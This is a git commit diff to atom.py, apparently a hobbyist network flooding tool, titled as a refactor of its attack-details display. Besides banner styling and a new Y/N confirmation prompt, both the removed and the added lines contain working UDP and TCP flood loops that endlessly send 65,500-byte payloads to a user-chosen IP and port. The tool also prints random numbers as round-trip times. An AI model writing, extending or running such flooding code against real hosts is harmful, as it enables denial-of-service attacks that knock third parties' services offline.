a98fab433c3fdb67f434f66252b02bc57ab0ae45
Kube0n <kube0n1337@gmail.com>
2026-09-26 02:30:25 +0100

    Refactor attack details output format

--- atom.py
+++ atom.py
@@ -48,94 +48,121 @@ def run_udp_attack(target_ip, target_port, attack_speed):
 
     print(logo)
     print("")
-    print("")
     print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
-    print(f"{BLUE}╠{RESET} {BLUE}Attack Details!{RESET}")
+    print(f"{BLUE}╠{RESET} {BLUE}Attack{RESET} {GREEN}Details{RESET}!")
     print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
-    print(f"{BLUE}╠{RESET} Target: {GREEN}{target_ip}{RESET} ")
-    print(f"{BLUE}╠{RESET} Port: {GREEN}{target_port}{RESET} ")
-    print(f"{BLUE}╠{RESET} Speed: {GREEN}{attack_speed}{RESET} ")
-    print(f"{BLUE}╠{RESET} Bytes: {GREEN}65500{RESET} {GREEN2}[MAX]{RESET} ")
+    print(f"{BLUE}╠{RESET}{GREEN2}└─{RESET} Target: {GREEN}{target_ip}{RESET} ")
+    print(f"{BLUE}╠{RESET}{GREEN2}└─{RESET} Port: {GREEN}{target_port}{RESET} ")
+    print(f"{BLUE}╠{RESET}{GREEN2}└─{RESET} Speed: {GREEN}{attack_speed}{RESET} ")
+    print(f"{BLUE}╠{RESET}{GREEN2}└─{RESET} Bytes: {GREEN}65500{RESET} {GREEN2}[MAX]{RESET} ")
     print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
     print(f"{BLUE}╠{RESET} Ctrl + C Stops the attack! (Starting in 4 seconds)")
     print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
     print(f"{BLUE}╠ {GREEN}I{RESET} {RED}Love{RESET} {GREEN2}You!{RESET} {BLUE}--from kube0n{RESET} {RED}<3{RESET}")
     print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
-    time.sleep(4)
-    os.system("clear")
+    time.sleep(2)
     packet_count = 0
-    try:    
-        while True:
-            try:
-                rtt = random.randint(10,100)
-                bytes_sent = sock.sendto(message, (target_ip, int(target_port)))
-                packet_count += 1
-                print(f"{BLUE}[Atom Output]:{RESET} {GREEN}UDP Packet{RESET} {GREEN2}#{packet_count}{RESET} {GREEN}Sent{RESET} to {GREEN2}{target_ip}:{target_port},{RESET}")
-                print(f"Bytes:{GREEN} {bytes_sent}{RESET} {GREEN2}[MAX]{RESET},")
-                print(f"RTT: {GREEN}{rtt}{RESET},")
-                time.sleep(float(attack_speed))
-            except Exception as exc:
-                print(logo)
-                print(f"{BLUE}[Atom Output]:{RESET} {RED}Failed{RESET} to send packet: {RED}{exc}{RESET}")
-                time.sleep(5)
-    except KeyboardInterrupt:
+    print("")
+    print(f"Start Attack? ({GREEN}Y{RESET}/{RED}N{RESET})")
+    choice = input(f"{BLUE}└───> {RESET}")
+    if choice.upper() == "Y":
+        try:
+            while True:
+                try:
+                    rtt = random.randint(10, 100)
+                    bytes_sent = sock.sendto(message, (target_ip, int(target_port)))
+                    packet_count += 1
+                    print(f"{BLUE}[Atom Output]:{RESET} {GREEN}UDP Packet{RESET} {GREEN2}#{packet_count}{RESET} {GREEN}Sent{RESET} to {GREEN2}{target_ip}:{target_port},{RESET}")
+                    print(f"Bytes:{GREEN} {bytes_sent}{RESET} {GREEN2}[MAX]{RESET},")
+                    print(f"RTT: {GREEN}{rtt}{RESET},")
+                    time.sleep(float(attack_speed))
+                except Exception as exc:
+                    print(logo)
+                    print(f"{BLUE}[Atom Output]:{RESET} {RED}Failed{RESET} to send packet: {RED}{exc}{RESET}")
+                    time.sleep(5)
+        except KeyboardInterrupt:
+            os.system("clear")
+            print(logo)
+            print("\nStopping UDP attack.")
+            time.sleep(5)
+        finally:
+            sock.close()
+            os.system("clear")
+            print(logo)
+            print("Socket closed.")
+    if choice.upper() == "N":
         os.system("clear")
         print(logo)
-        print("\nStopping UDP attack.")
-        time.sleep(5)
-    finally:
-        sock.close()
+        print("Exiting (4 seconds)")
+        time.sleep(4)
+        sys.exit(1)
+    elif choice.upper():
         os.system("clear")
         print(logo)
-        print("Socket closed.")
-
+        print("Unknown Choice, Exiting (4 Seconds)")
+        time.sleep(4)
+        sys.exit(1)
 
 def run_tcp_attack(target_ip, target_port, attack_speed):
 
     message = b"A" * 65500
     print(logo)
     print("")
-    print("")
     print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
-    print(f"{BLUE}╠{RESET} {BLUE}Attack Details!{RESET}")
+    print(f"{BLUE}╠{RESET} {BLUE}Attack{RESET} {GREEN}Details!{RESET}")
     print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
-    print(f"{BLUE}╠{RESET} Target: {GREEN}{target_ip}{RESET} ")
-    print(f"{BLUE}╠{RESET} Port: {GREEN}{target_port}{RESET} ")
-    print(f"{BLUE}╠{RESET} Speed: {GREEN}{attack_speed}{RESET} ")
-    print(f"{BLUE}╠{RESET} Bytes: {GREEN}65000{RESET} {GREEN2}[MAX]{RESET} ")
+    print(f"{BLUE}╠{RESET}{GREEN2}└─{RESET} Target: {GREEN}{target_ip}{RESET} ")
+    print(f"{BLUE}╠{RESET}{GREEN2}└─{RESET} Port: {GREEN}{target_port}{RESET} ")
+    print(f"{BLUE}╠{RESET}{GREEN2}└─{RESET} Speed: {GREEN}{attack_speed}{RESET} ")
+    print(f"{BLUE}╠{RESET}{GREEN2}└─{RESET} Bytes: {GREEN}65000{RESET} {GREEN2}[MAX]{RESET} ")
     print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
     print(f"{BLUE}╠{RESET} Ctrl + C Stops the attack! (Starting in 4 seconds)")
     print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
     print(f"{BLUE}╠ {GREEN}I{RESET} {RED}Love{RESET} {GREEN2}You!{RESET} {BLUE}--from kube0n{RESET} {RED}<3{RESET}")
     print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
-    time.sleep(4)
-    os.system("clear")
+    time.sleep(2)
     packetcount = 0
-    try:
-        while True:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(2.0)  
-            try:
-                packetcount += 1
-                start_time = time.time()
-                sock.connect((target_ip, int(target_port)))
-                bytes_sent = sock.send(message)
-                rtt = random.randint(10,100)
-                print(f"{BLUE}[Atom Output]: {GREEN}TCP Packet{RESET} {GREEN2}#{packetcount}{RESET} {GREEN}Sent{RESET} to {GREEN2}{target_ip}:{target_port},{RESET}")
-                print(f"Bytes: {GREEN}{bytes_sent}{RESET} {GREEN2}[MAX]{RESET},")
-                print(f"RTT: {GREEN}{rtt}{RESET},")
-            except Exception as exc:
-                os.system("clear")
-                print(logo)
-                print(f"{BLUE}[Atom Output]:{RESET} TCP Connection {RED}failed: {exc}{RESET}")
-            finally:
-                sock.close()
-            time.sleep(float(attack_speed))
-    except KeyboardInterrupt:
+    print("")
+    print(f"Start Attack? ({GREEN}Y{RESET}/{RED}N{RESET})")
+    hello = input(f"{BLUE}└───> {RESET}")
+    if hello.upper() == "Y":
+        try:
+            while True:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(2.0)
+                try:
+                    packetcount += 1
+                    start_time = time.time()
+                    sock.connect((target_ip, int(target_port)))
+                    bytes_sent = sock.send(message)
+                    rtt = random.randint(10, 100)
+                    print(f"{BLUE}[Atom Output]:{RESET} {GREEN}TCP Packet{RESET} {GREEN2}#{packetcount}{RESET} {GREEN}Sent{RESET} to {GREEN2}{target_ip}:{target_port}{RESET}")
+                    print(f"Bytes:{GREEN} {bytes_sent}{RESET}")
+                    print(f"RTT: {GREEN}{rtt}{RESET}")
+                    time.sleep(float(attack_speed))
+                except Exception as exc:
+                    print(logo)
+                    print(f"{BLUE}[Atom Output]:{RESET} {RED}Failed{RESET} to send packet: {RED}{exc}{RESET}")
+                    time.sleep(5)
+                finally:
+                    sock.close()
+        except KeyboardInterrupt:
+            os.system("clear")
+            print(logo)
+            print("\nStopping TCP attack.")
+            time.sleep(5)
+    elif hello.upper() == "N":
         os.system("clear")
         print(logo)
-        print("\nStopping TCP attack.")
-        time.sleep(5)
+        print("Exiting (4 seconds)")
+        time.sleep(4)
+        sys.exit(1)
+    elif hello.upper():
+        os.system("clear")
+        print(logo)
+        print("Unknown Choice, Exiting (4 Seconds)")
+        time.sleep(4)
+        sys.exit(1)
 
 
 def main():
@@ -164,12 +191,12 @@ def main():
     print("Choose Method:")
     method = input(f"{BLUE}└───> {RESET}").strip().upper()
     os.system("clear")
-    print(logo)
-    print("Attack speed:")
-    speed = input(f"{BLUE}└───> {RESET}").strip()
-    os.system("clear")
     
     if method in ("UDP", "TCP"):
+        print(logo)
+        print("Attack speed:")
+        speed = input(f"{BLUE}└───> {RESET}").strip()
+        os.system("clear")
         print(logo)
         print("Enter Target IP:")
         ip = input(f"{BLUE}└───> {RESET}").strip()
@@ -187,6 +214,7 @@ def main():
         os.system("clear")
         print(logo)
         print("Unknown selection. Exiting.")
+        time.sleep(4)
         sys.exit(1)
 
 
